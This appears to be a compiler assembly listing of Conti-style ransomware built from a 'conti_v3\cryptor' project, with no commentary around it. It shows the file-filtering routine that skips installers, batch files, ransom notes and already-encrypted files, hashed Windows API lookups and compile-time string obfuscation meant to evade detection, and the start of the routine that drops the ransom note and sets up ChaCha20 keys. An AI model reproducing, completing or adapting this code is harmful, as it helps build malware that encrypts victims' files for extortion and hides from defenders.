  00316	2b c8		 sub	 ecx, eax
  00318	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0031d	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00320	f7 e9		 imul	 ecx
  00322	03 d1		 add	 edx, ecx
  00324	c1 fa 06	 sar	 edx, 6
  00327	8b c2		 mov	 eax, edx
  00329	c1 e8 1f	 shr	 eax, 31
  0032c	03 d0		 add	 edx, eax
  0032e	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00331	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00333	42 88 4c 05 b8	 mov	 BYTE PTR $T5[rbp+r8-168], cl
  00338	49 ff c0	 inc	 r8
  0033b	49 83 f8 0a	 cmp	 r8, 10
  0033f	72 af		 jb	 SHORT $LL171@CheckFilen
$LN170@CheckFilen:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\search.cpp

; 80   : 		OBFW(L".msi"),

  00341	48 8d 45 b8	 lea	 rax, QWORD PTR $T5[rbp-168]
  00345	48 89 45 37	 mov	 QWORD PTR BlackList$[rbp-137], rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  00349	88 5d d7	 mov	 BYTE PTR $T6[rbp-169], bl
  0034c	c6 45 d8 03	 mov	 BYTE PTR $T6[rbp-168], 3
  00350	c6 45 d9 2e	 mov	 BYTE PTR $T6[rbp-167], 46 ; 0000002eH
  00354	c6 45 da 57	 mov	 BYTE PTR $T6[rbp-166], 87 ; 00000057H
  00358	c6 45 db 2e	 mov	 BYTE PTR $T6[rbp-165], 46 ; 0000002eH
  0035c	c6 45 dc 40	 mov	 BYTE PTR $T6[rbp-164], 64 ; 00000040H
  00360	c6 45 dd 2e	 mov	 BYTE PTR $T6[rbp-163], 46 ; 0000002eH
  00364	c6 45 de 71	 mov	 BYTE PTR $T6[rbp-162], 113 ; 00000071H
  00368	c6 45 df 2e	 mov	 BYTE PTR $T6[rbp-161], 46 ; 0000002eH
  0036c	c6 45 e0 06	 mov	 BYTE PTR $T6[rbp-160], 6
  00370	c6 45 e1 2e	 mov	 BYTE PTR $T6[rbp-159], 46 ; 0000002eH
  00374	c6 45 e2 57	 mov	 BYTE PTR $T6[rbp-158], 87 ; 00000057H
  00378	c6 45 e3 2e	 mov	 BYTE PTR $T6[rbp-157], 46 ; 0000002eH
  0037c	c6 45 e4 78	 mov	 BYTE PTR $T6[rbp-156], 120 ; 00000078H
  00380	c6 45 e5 2e	 mov	 BYTE PTR $T6[rbp-155], 46 ; 0000002eH
  00384	c6 45 e6 4e	 mov	 BYTE PTR $T6[rbp-154], 78 ; 0000004eH
  00388	c6 45 e7 2e	 mov	 BYTE PTR $T6[rbp-153], 46 ; 0000002eH
  0038c	c6 45 e8 65	 mov	 BYTE PTR $T6[rbp-152], 101 ; 00000065H
  00390	c6 45 e9 2e	 mov	 BYTE PTR $T6[rbp-151], 46 ; 0000002eH
  00394	c6 45 ea 4e	 mov	 BYTE PTR $T6[rbp-150], 78 ; 0000004eH
  00398	c6 45 eb 2e	 mov	 BYTE PTR $T6[rbp-149], 46 ; 0000002eH
  0039c	c6 45 ec 2e	 mov	 BYTE PTR $T6[rbp-148], 46 ; 0000002eH
  003a0	c6 45 ed 2e	 mov	 BYTE PTR $T6[rbp-147], 46 ; 0000002eH
  003a4	0f b6 45 d8	 movzx	 eax, BYTE PTR $T6[rbp-168]

; 58   :         return m_isDecrypted;

  003a8	0f b6 45 d7	 movzx	 eax, BYTE PTR $T6[rbp-169]

; 63   :         if (!isDecrypted())

  003ac	84 c0		 test	 al, al
  003ae	75 61		 jne	 SHORT $LN228@CheckFilen

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  003b0	4c 8b c3	 mov	 r8, rbx
  003b3	0f 1f 40 00 66
	0f 1f 84 00 00
	00 00 00	 npad	 13
$LL229@CheckFilen:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  003c0	42 0f b6 4c 05
	d8		 movzx	 ecx, BYTE PTR $T6[rbp+r8-168]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  003c6	b8 2e 00 00 00	 mov	 eax, 46			; 0000002eH
  003cb	2b c1		 sub	 eax, ecx
  003cd	6b c8 2c	 imul	 ecx, eax, 44		; 0000002cH

; 40   :     return (a % n + n) % n;

  003d0	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  003d5	f7 e9		 imul	 ecx
  003d7	03 d1		 add	 edx, ecx
  003d9	c1 fa 06	 sar	 edx, 6
  003dc	8b c2		 mov	 eax, edx
  003de	c1 e8 1f	 shr	 eax, 31
  003e1	03 d0		 add	 edx, eax
  003e3	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  003e6	2b c8		 sub	 ecx, eax
  003e8	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  003ed	83 c1 7f	 add	 ecx, 127		; 0000007fH
  003f0	f7 e9		 imul	 ecx
  003f2	03 d1		 add	 edx, ecx
  003f4	c1 fa 06	 sar	 edx, 6
  003f7	8b c2		 mov	 eax, edx
  003f9	c1 e8 1f	 shr	 eax, 31
  003fc	03 d0		 add	 edx, eax
  003fe	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00401	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00403	42 88 4c 05 d8	 mov	 BYTE PTR $T6[rbp+r8-168], cl
  00408	49 ff c0	 inc	 r8
  0040b	49 83 f8 16	 cmp	 r8, 22
  0040f	72 af		 jb	 SHORT $LL229@CheckFilen
$LN228@CheckFilen:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\search.cpp

; 81   : 		OBFW(L"readme.txt"),

  00411	48 8d 45 d8	 lea	 rax, QWORD PTR $T6[rbp-168]
  00415	48 89 45 3f	 mov	 QWORD PTR BlackList$[rbp-129], rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  00419	88 5d ef	 mov	 BYTE PTR $T7[rbp-169], bl
  0041c	c6 45 f0 48	 mov	 BYTE PTR $T7[rbp-168], 72 ; 00000048H
  00420	c6 45 f1 37	 mov	 BYTE PTR $T7[rbp-167], 55 ; 00000037H
  00424	c6 45 f2 5e	 mov	 BYTE PTR $T7[rbp-166], 94 ; 0000005eH
  00428	c6 45 f3 37	 mov	 BYTE PTR $T7[rbp-165], 55 ; 00000037H
  0042c	c6 45 f4 47	 mov	 BYTE PTR $T7[rbp-164], 71 ; 00000047H
  00430	c6 45 f5 37	 mov	 BYTE PTR $T7[rbp-163], 55 ; 00000037H
  00434	c6 45 f6 52	 mov	 BYTE PTR $T7[rbp-162], 82 ; 00000052H
  00438	c6 45 f7 37	 mov	 BYTE PTR $T7[rbp-161], 55 ; 00000037H
  0043c	c6 45 f8 53	 mov	 BYTE PTR $T7[rbp-160], 83 ; 00000053H
  00440	c6 45 f9 37	 mov	 BYTE PTR $T7[rbp-159], 55 ; 00000037H
  00444	c6 45 fa 51	 mov	 BYTE PTR $T7[rbp-158], 81 ; 00000051H
  00448	c6 45 fb 37	 mov	 BYTE PTR $T7[rbp-157], 55 ; 00000037H
  0044c	c6 45 fc 19	 mov	 BYTE PTR $T7[rbp-156], 25
  00450	c6 45 fd 37	 mov	 BYTE PTR $T7[rbp-155], 55 ; 00000037H
  00454	c6 45 fe 5e	 mov	 BYTE PTR $T7[rbp-154], 94 ; 0000005eH
  00458	c6 45 ff 37	 mov	 BYTE PTR $T7[rbp-153], 55 ; 00000037H
  0045c	c6 45 00 25	 mov	 BYTE PTR $T7[rbp-152], 37 ; 00000025H
  00460	c6 45 01 37	 mov	 BYTE PTR $T7[rbp-151], 55 ; 00000037H
  00464	c6 45 02 61	 mov	 BYTE PTR $T7[rbp-150], 97 ; 00000061H
  00468	c6 45 03 37	 mov	 BYTE PTR $T7[rbp-149], 55 ; 00000037H
  0046c	c6 45 04 38	 mov	 BYTE PTR $T7[rbp-148], 56 ; 00000038H
  00470	c6 45 05 37	 mov	 BYTE PTR $T7[rbp-147], 55 ; 00000037H
  00474	c6 45 06 15	 mov	 BYTE PTR $T7[rbp-146], 21
  00478	c6 45 07 37	 mov	 BYTE PTR $T7[rbp-145], 55 ; 00000037H
  0047c	c6 45 08 38	 mov	 BYTE PTR $T7[rbp-144], 56 ; 00000038H
  00480	c6 45 09 37	 mov	 BYTE PTR $T7[rbp-143], 55 ; 00000037H
  00484	c6 45 0a 37	 mov	 BYTE PTR $T7[rbp-142], 55 ; 00000037H
  00488	c6 45 0b 37	 mov	 BYTE PTR $T7[rbp-141], 55 ; 00000037H
  0048c	0f b6 45 f0	 movzx	 eax, BYTE PTR $T7[rbp-168]

; 58   :         return m_isDecrypted;

  00490	0f b6 45 ef	 movzx	 eax, BYTE PTR $T7[rbp-169]

; 63   :         if (!isDecrypted())

  00494	84 c0		 test	 al, al
  00496	75 59		 jne	 SHORT $LN298@CheckFilen

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  00498	4c 8b c3	 mov	 r8, rbx
  0049b	0f 1f 44 00 00	 npad	 5
$LL299@CheckFilen:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  004a0	42 0f b6 4c 05
	f0		 movzx	 ecx, BYTE PTR $T7[rbp+r8-168]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  004a6	b8 37 00 00 00	 mov	 eax, 55			; 00000037H
  004ab	2b c1		 sub	 eax, ecx
  004ad	6b c8 0b	 imul	 ecx, eax, 11

; 40   :     return (a % n + n) % n;

  004b0	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  004b5	f7 e9		 imul	 ecx
  004b7	03 d1		 add	 edx, ecx
  004b9	c1 fa 06	 sar	 edx, 6
  004bc	8b c2		 mov	 eax, edx
  004be	c1 e8 1f	 shr	 eax, 31
  004c1	03 d0		 add	 edx, eax
  004c3	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  004c6	2b c8		 sub	 ecx, eax
  004c8	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  004cd	83 c1 7f	 add	 ecx, 127		; 0000007fH
  004d0	f7 e9		 imul	 ecx
  004d2	03 d1		 add	 edx, ecx
  004d4	c1 fa 06	 sar	 edx, 6
  004d7	8b c2		 mov	 eax, edx
  004d9	c1 e8 1f	 shr	 eax, 31
  004dc	03 d0		 add	 edx, eax
  004de	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  004e1	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  004e3	42 88 4c 05 f0	 mov	 BYTE PTR $T7[rbp+r8-168], cl
  004e8	49 ff c0	 inc	 r8
  004eb	49 83 f8 1c	 cmp	 r8, 28
  004ef	72 af		 jb	 SHORT $LL299@CheckFilen
$LN298@CheckFilen:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\search.cpp

; 82   : 		OBFW(L"CONTI_LOG.txt"),

  004f1	48 8d 45 f0	 lea	 rax, QWORD PTR $T7[rbp-168]
  004f5	48 89 45 47	 mov	 QWORD PTR BlackList$[rbp-121], rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  004f9	88 5d c7	 mov	 BYTE PTR $T8[rbp-169], bl
  004fc	c6 45 c8 67	 mov	 BYTE PTR $T8[rbp-168], 103 ; 00000067H
  00500	c6 45 c9 5c	 mov	 BYTE PTR $T8[rbp-167], 92 ; 0000005cH
  00504	c6 45 ca 05	 mov	 BYTE PTR $T8[rbp-166], 5
  00508	c6 45 cb 5c	 mov	 BYTE PTR $T8[rbp-165], 92 ; 0000005cH
  0050c	c6 45 cc 02	 mov	 BYTE PTR $T8[rbp-164], 2
  00510	c6 45 cd 5c	 mov	 BYTE PTR $T8[rbp-163], 92 ; 0000005cH
  00514	c6 45 ce 3b	 mov	 BYTE PTR $T8[rbp-162], 59 ; 0000003bH
  00518	c6 45 cf 5c	 mov	 BYTE PTR $T8[rbp-161], 92 ; 0000005cH
  0051c	c6 45 d0 5c	 mov	 BYTE PTR $T8[rbp-160], 92 ; 0000005cH
  00520	c6 45 d1 5c	 mov	 BYTE PTR $T8[rbp-159], 92 ; 0000005cH
  00524	0f b6 45 c8	 movzx	 eax, BYTE PTR $T8[rbp-168]

; 58   :         return m_isDecrypted;

  00528	0f b6 45 c7	 movzx	 eax, BYTE PTR $T8[rbp-169]

; 63   :         if (!isDecrypted())

  0052c	84 c0		 test	 al, al
  0052e	75 61		 jne	 SHORT $LN332@CheckFilen

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  00530	4c 8b c3	 mov	 r8, rbx
  00533	0f 1f 40 00 66
	0f 1f 84 00 00
	00 00 00	 npad	 13
$LL333@CheckFilen:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00540	42 0f b6 4c 05
	c8		 movzx	 ecx, BYTE PTR $T8[rbp+r8-168]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00546	b8 5c 00 00 00	 mov	 eax, 92			; 0000005cH
  0054b	2b c1		 sub	 eax, ecx
  0054d	6b c8 2a	 imul	 ecx, eax, 42		; 0000002aH

; 40   :     return (a % n + n) % n;

  00550	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00555	f7 e9		 imul	 ecx
  00557	03 d1		 add	 edx, ecx
  00559	c1 fa 06	 sar	 edx, 6
  0055c	8b c2		 mov	 eax, edx
  0055e	c1 e8 1f	 shr	 eax, 31
  00561	03 d0		 add	 edx, eax
  00563	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00566	2b c8		 sub	 ecx, eax
  00568	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0056d	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00570	f7 e9		 imul	 ecx
  00572	03 d1		 add	 edx, ecx
  00574	c1 fa 06	 sar	 edx, 6
  00577	8b c2		 mov	 eax, edx
  00579	c1 e8 1f	 shr	 eax, 31
  0057c	03 d0		 add	 edx, eax
  0057e	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00581	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00583	42 88 4c 05 c8	 mov	 BYTE PTR $T8[rbp+r8-168], cl
  00588	49 ff c0	 inc	 r8
  0058b	49 83 f8 0a	 cmp	 r8, 10
  0058f	72 af		 jb	 SHORT $LL333@CheckFilen
$LN332@CheckFilen:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 1006 : 	pFunction = (PCWSTR(WINAPI*)(PCWSTR, PCWSTR))getapi::GetProcAddressEx2(NULL, SHLWAPI_MODULE_ID, 0xf8aefe61, 23);//GetProcAddress(hShlwapi, OBFA("StrStrIW"));

  00591	ba 16 00 00 00	 mov	 edx, 22
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\search.cpp

; 83   : 		OBFW(L".bat")

  00596	48 8d 45 c8	 lea	 rax, QWORD PTR $T8[rbp-168]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 1006 : 	pFunction = (PCWSTR(WINAPI*)(PCWSTR, PCWSTR))getapi::GetProcAddressEx2(NULL, SHLWAPI_MODULE_ID, 0xf8aefe61, 23);//GetProcAddress(hShlwapi, OBFA("StrStrIW"));

  0059a	41 b8 61 fe ae
	f8		 mov	 r8d, -122749343		; f8aefe61H
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\search.cpp

; 83   : 		OBFW(L".bat")

  005a0	48 89 45 4f	 mov	 QWORD PTR BlackList$[rbp-113], rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 1006 : 	pFunction = (PCWSTR(WINAPI*)(PCWSTR, PCWSTR))getapi::GetProcAddressEx2(NULL, SHLWAPI_MODULE_ID, 0xf8aefe61, 23);//GetProcAddress(hShlwapi, OBFA("StrStrIW"));

  005a4	44 8d 4a 01	 lea	 r9d, QWORD PTR [rdx+1]
  005a8	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 1007 : 	return pFunction(pszFirst, pszSrch);

  005ad	48 8d 15 00 00
	00 00		 lea	 rdx, OFFSET FLAT:?g_Extention@@3PA_WA ; g_Extention
  005b4	48 8b cf	 mov	 rcx, rdi
  005b7	ff d0		 call	 rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\search.cpp

; 87   : 	if (pStrStrIW(FileName, global::GetExtention())) {

  005b9	48 85 c0	 test	 rax, rax
  005bc	75 35		 jne	 SHORT $LN353@CheckFilen
  005be	66 90		 npad	 2
$LL4@CheckFilen:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 1006 : 	pFunction = (PCWSTR(WINAPI*)(PCWSTR, PCWSTR))getapi::GetProcAddressEx2(NULL, SHLWAPI_MODULE_ID, 0xf8aefe61, 23);//GetProcAddress(hShlwapi, OBFA("StrStrIW"));

  005c0	ba 16 00 00 00	 mov	 edx, 22
  005c5	41 b8 61 fe ae
	f8		 mov	 r8d, -122749343		; f8aefe61H
  005cb	44 8d 4a 01	 lea	 r9d, QWORD PTR [rdx+1]
  005cf	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 1007 : 	return pFunction(pszFirst, pszSrch);

  005d4	48 8b 54 dd 17	 mov	 rdx, QWORD PTR BlackList$[rbp+rbx*8-169]
  005d9	48 8b cf	 mov	 rcx, rdi
  005dc	ff d0		 call	 rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\search.cpp

; 93   : 		if (pStrStrIW(FileName, BlackList[i])) {

  005de	48 85 c0	 test	 rax, rax
  005e1	75 10		 jne	 SHORT $LN353@CheckFilen

; 88   : 		return FALSE;
; 89   : 	}
; 90   : 
; 91   : 	INT Count = sizeof(BlackList) / sizeof(LPWSTR);
; 92   : 	for (INT i = 0; i < Count; i++) {

  005e3	48 ff c3	 inc	 rbx
  005e6	48 83 fb 08	 cmp	 rbx, 8
  005ea	7c d4		 jl	 SHORT $LL4@CheckFilen

; 95   : 		}
; 96   : 	}
; 97   : 
; 98   : 	return TRUE;

  005ec	b8 01 00 00 00	 mov	 eax, 1
  005f1	eb 02		 jmp	 SHORT $LN1@CheckFilen
$LN353@CheckFilen:

; 94   : 			return FALSE;

  005f3	33 c0		 xor	 eax, eax
$LN1@CheckFilen:

; 99   : }

  005f5	4c 8d 9c 24 00
	01 00 00	 lea	 r11, QWORD PTR [rsp+256]
  005fd	49 8b 5b 10	 mov	 rbx, QWORD PTR [r11+16]
  00601	49 8b 7b 18	 mov	 rdi, QWORD PTR [r11+24]
  00605	49 8b e3	 mov	 rsp, r11
  00608	5d		 pop	 rbp
  00609	c3		 ret	 0
?CheckFilename@@YAHPEB_W@Z ENDP				; CheckFilename
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\search.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\search.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\search.cpp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\search.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\memory.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\search.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\memory.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\search.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\search.cpp
; File C:\Program Files (x86)\Windows Kits\10\Include\10.0.22621.0\um\winnt.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\chacha20\chacha.c
; File C:\Program Files (x86)\Windows Kits\10\Include\10.0.22621.0\um\winnt.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\chacha20\chacha.c
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Program Files (x86)\Windows Kits\10\Include\10.0.22621.0\um\winnt.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\search.cpp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\search.cpp
;	COMDAT ?DropInstruction@@YAXV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@@Z
_TEXT	SEGMENT
$T1 = 64
ChaChaIV$ = 88
$T2 = 96
$T4 = 128
Filename$ = 160
CryptCtx$ = 192
BytesWritten$ = 256
ChaChaKey$ = 264
__$ArrayPad$ = 296
Directory$ = 384
?DropInstruction@@YAXV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@@Z PROC ; DropInstruction, COMDAT

; 104  : {

$LN296:
  00000	40 55		 push	 rbp
  00002	53		 push	 rbx
  00003	56		 push	 rsi
  00004	57		 push	 rdi
  00005	41 54		 push	 r12
  00007	48 8d 6c 24 b0	 lea	 rbp, QWORD PTR [rsp-80]
  0000c	48 81 ec 50 01
	00 00		 sub	 rsp, 336		; 00000150H
  00013	48 8b 05 00 00
	00 00		 mov	 rax, QWORD PTR __security_cookie
  0001a	48 33 c4	 xor	 rax, rsp
  0001d	48 89 45 28	 mov	 QWORD PTR __$ArrayPad$[rbp-256], rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  00021	c6 44 24 40 00	 mov	 BYTE PTR $T1[rsp], 0

; 63   :         if (!isDecrypted())

  00026	33 db		 xor	 ebx, ebx

; 51   :         : m_buffer{ encrypt(data[Ints])... }

  00028	c6 44 24 41 39	 mov	 BYTE PTR $T1[rsp+1], 57	; 00000039H
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\search.cpp

; 104  : {

  0002d	48 8b f1	 mov	 rsi, rcx
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 51   :         : m_buffer{ encrypt(data[Ints])... }

  00030	c6 44 24 42 49	 mov	 BYTE PTR $T1[rsp+2], 73	; 00000049H
  00035	c6 44 24 43 29	 mov	 BYTE PTR $T1[rsp+3], 41	; 00000029H
  0003a	c6 44 24 44 49	 mov	 BYTE PTR $T1[rsp+4], 73	; 00000049H
  0003f	c6 44 24 45 7c	 mov	 BYTE PTR $T1[rsp+5], 124 ; 0000007cH
  00044	c6 44 24 46 49	 mov	 BYTE PTR $T1[rsp+6], 73	; 00000049H
  00049	c6 44 24 47 1e	 mov	 BYTE PTR $T1[rsp+7], 30
  0004e	c6 44 24 48 49	 mov	 BYTE PTR $T1[rsp+8], 73	; 00000049H
  00053	c6 44 24 49 02	 mov	 BYTE PTR $T1[rsp+9], 2
  00058	c6 44 24 4a 49	 mov	 BYTE PTR $T1[rsp+10], 73 ; 00000049H
  0005d	c6 44 24 4b 29	 mov	 BYTE PTR $T1[rsp+11], 41 ; 00000029H
  00062	c6 44 24 4c 49	 mov	 BYTE PTR $T1[rsp+12], 73 ; 00000049H
  00067	c6 44 24 4d 47	 mov	 BYTE PTR $T1[rsp+13], 71 ; 00000047H
  0006c	c6 44 24 4e 49	 mov	 BYTE PTR $T1[rsp+14], 73 ; 00000049H
  00071	c6 44 24 4f 4f	 mov	 BYTE PTR $T1[rsp+15], 79 ; 0000004fH
  00076	c6 44 24 50 49	 mov	 BYTE PTR $T1[rsp+16], 73 ; 00000049H
  0007b	c6 44 24 51 7b	 mov	 BYTE PTR $T1[rsp+17], 123 ; 0000007bH
  00080	c6 44 24 52 49	 mov	 BYTE PTR $T1[rsp+18], 73 ; 00000049H
  00085	c6 44 24 53 4f	 mov	 BYTE PTR $T1[rsp+19], 79 ; 0000004fH
  0008a	c6 44 24 54 49	 mov	 BYTE PTR $T1[rsp+20], 73 ; 00000049H
  0008f	c6 44 24 55 49	 mov	 BYTE PTR $T1[rsp+21], 73 ; 00000049H
  00094	c6 44 24 56 49	 mov	 BYTE PTR $T1[rsp+22], 73 ; 00000049H
  00099	0f b6 44 24 41	 movzx	 eax, BYTE PTR $T1[rsp+1]

; 58   :         return m_isDecrypted;

  0009e	0f b6 44 24 40	 movzx	 eax, BYTE PTR $T1[rsp]

; 63   :         if (!isDecrypted())

  000a3	84 c0		 test	 al, al
  000a5	75 58		 jne	 SHORT $LN53@DropInstru

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  000a7	8b fb		 mov	 edi, ebx
  000a9	0f 1f 80 00 00
	00 00		 npad	 7
$LL54@DropInstru:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  000b0	0f b6 4c 3c 41	 movzx	 ecx, BYTE PTR $T1[rsp+rdi+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  000b5	b8 49 00 00 00	 mov	 eax, 73			; 00000049H
  000ba	2b c1		 sub	 eax, ecx
  000bc	6b c8 17	 imul	 ecx, eax, 23

; 40   :     return (a % n + n) % n;

  000bf	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  000c4	f7 e9		 imul	 ecx
  000c6	03 d1		 add	 edx, ecx
  000c8	c1 fa 06	 sar	 edx, 6
  000cb	8b c2		 mov	 eax, edx
  000cd	c1 e8 1f	 shr	 eax, 31
  000d0	03 d0		 add	 edx, eax
  000d2	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  000d5	2b c8		 sub	 ecx, eax
  000d7	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  000dc	83 c1 7f	 add	 ecx, 127		; 0000007fH
  000df	f7 e9		 imul	 ecx
  000e1	03 d1		 add	 edx, ecx
  000e3	c1 fa 06	 sar	 edx, 6
  000e6	8b c2		 mov	 eax, edx
  000e8	c1 e8 1f	 shr	 eax, 31
  000eb	03 d0		 add	 edx, eax
  000ed	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  000f0	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  000f2	88 4c 3c 41	 mov	 BYTE PTR $T1[rsp+rdi+1], cl
  000f6	48 ff c7	 inc	 rdi
  000f9	48 83 ff 16	 cmp	 rdi, 22
  000fd	72 b1		 jb	 SHORT $LL54@DropInstru
$LN53@DropInstru:
  000ff	4c 89 ac 24 88
	01 00 00	 mov	 QWORD PTR [rsp+392], r13
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\search.cpp

; 106  : 	std::wstring Filename = MakePath(Directory, str);

  00107	48 8d 54 24 41	 lea	 rdx, QWORD PTR $T1[rsp+1]
  0010c	4c 89 b4 24 90
	01 00 00	 mov	 QWORD PTR [rsp+400], r14
  00114	48 8d 4c 24 60	 lea	 rcx, QWORD PTR $T2[rsp]
  00119	4c 89 bc 24 98
	01 00 00	 mov	 QWORD PTR [rsp+408], r15
  00121	0f 29 b4 24 40
	01 00 00	 movaps	 XMMWORD PTR [rsp+320], xmm6
  00129	0f 29 bc 24 30
	01 00 00	 movaps	 XMMWORD PTR [rsp+304], xmm7
  00131	e8 00 00 00 00	 call	 ??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@QEB_W@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >
  00136	48 8b d6	 mov	 rdx, rsi
  00139	48 8d 4d 80	 lea	 rcx, QWORD PTR $T4[rbp-256]
  0013d	48 8b f8	 mov	 rdi, rax
  00140	e8 00 00 00 00	 call	 ??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@AEBV01@@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >
  00145	48 8b d0	 mov	 rdx, rax
